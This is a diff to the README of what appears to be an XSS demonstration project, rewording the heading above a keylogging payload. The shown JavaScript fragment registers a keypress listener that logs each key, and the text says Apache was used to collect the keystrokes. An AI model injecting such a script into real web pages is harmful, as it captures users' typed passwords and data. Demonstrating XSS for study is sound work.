@@ -5,7 +5,7 @@ I hosted the website on my **Tomcat** Server and used **Apache** for **Keyloggin
 
 ![XSS](https://github.com/Miraj50/XSS-Demo/blob/master/XSS_Demo.gif)
 
-The payload for keylogging:
+The *payload* used for Keylogging:
 ```
 document.addEventListener('keypress', function() {
 	console.log(arguments[0].key);
